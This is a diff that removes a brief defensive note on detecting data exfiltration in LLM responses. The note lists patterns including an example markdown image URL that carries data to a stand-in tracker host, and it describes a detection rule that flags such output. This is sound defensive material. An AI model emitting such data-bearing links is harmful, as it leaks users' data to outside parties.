@@ -1,9 +1,0 @@
-Exfiltration detection best practices for AI systems
-
-Common patterns that indicate data exfiltration attempts in LLM responses:
-1. Markdown image URLs with query parameters containing data: ![x](https://tracker.example.com/px?d=DATA)
-2. URLs with base64-encoded fragments
-3. Unexpected redirects to external domains
-4. Hidden HTML elements with embedded content
-
-Detection approach: parse all URLs in model output, flag those with data-bearing query strings. Sieve's IN-GEN-04 rule catches the markdown image pattern specifically, raising a "high" severity warning for user review.
